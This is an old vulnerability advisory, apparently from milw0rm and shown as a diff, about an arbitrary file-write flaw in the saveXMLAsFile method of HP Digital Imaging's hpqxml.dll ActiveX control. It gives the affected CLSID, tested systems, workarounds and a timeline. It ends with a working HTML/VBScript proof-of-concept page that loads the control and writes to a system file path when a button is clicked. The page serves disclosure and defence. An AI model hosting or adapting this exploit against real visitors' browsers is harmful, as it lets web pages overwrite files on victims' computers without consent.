@@ -1,0 +1,79 @@
+:. GOODFELLAS Security Research TEAM  .:
+:. http://goodfellas.shellcode.com.ar .:
+<!--
+hpqxml.dll 2.0.0.133 from HP Digital Imaging Arbitary Data Write
+===============================================
+
+Internal ID: VULWAR200706275.
+
+Introduction
+
+hpqxml.dll is a library included in the HP Photo Digital Imaging
+software package from the HP Company. http://www.hp.com.
+Link: http://www.hp.com/united-states/consumer/digital_photography/home_f.html
+
+Tested In
+
+- Windows XP SP2 english/french with IE 6.0 / 7.0.
+- Windows vista Professional English/French SP1 with IE 7.0
+
+Summary
+
+The saveXMLAsFile method doesn't check if it is being called from the application
+or from a malicious user.
+
+Impact
+
+The vulnerability is due to an error in the saveXMLAsFile method that manipulate
+local files insecurely, which could allow malicious users to write arbitrary
+data to any file on a vulnerable system. Besides, the method does not check the
+file headers before writing.
+
+Workaround
+
+- Activate the Kill bit zero in clsid:9C0A0321-B328-466C-8ECA-B9A5522466D3.
+- Unregister hpqxml.dll using regsvr32.
+
+Timeline
+
+June 27, 2007 -- Bug discovery.
+June 27, 2007 -- Bug published.
+
+Credits
+
+ * callAX <callax@shellcode.com.ar>
+ * GoodFellas Security Research Team <goodfellas.shellcode.com.ar>
+
+Technical Detail
+
+saveXMLAsFile method receives a filename as an argument, with this format "c:\path\file".
+
+Proof of Concept
+-->
+
+<html>
+<head>
+<title>Hpqxml.dll 2.0.0.133 HP Digital Imaging Arbitary Data Write</title>
+</head>
+<body>
+<h3>Hpqxml.dll 2.0.0.133 HP Digital Imaging Arbitary Data Write</h3><br>
+
+<object classid='clsid:9C0A0321-B328-466C-8ECA-B9A5522466D3' id='target' /></object>
+
+<input language=VBScript onclick=HP() type=button value="Proof of Concept">
+
+<script language = 'vbscript'>
+
+Sub HP()
+
+ filename = "C:\NTDETECT_.COM"
+
+ target.saveXMLAsFile filename
+
+End Sub
+
+</script>
+</body>
+</html>
+
+# milw0rm.com [2007-06-27]
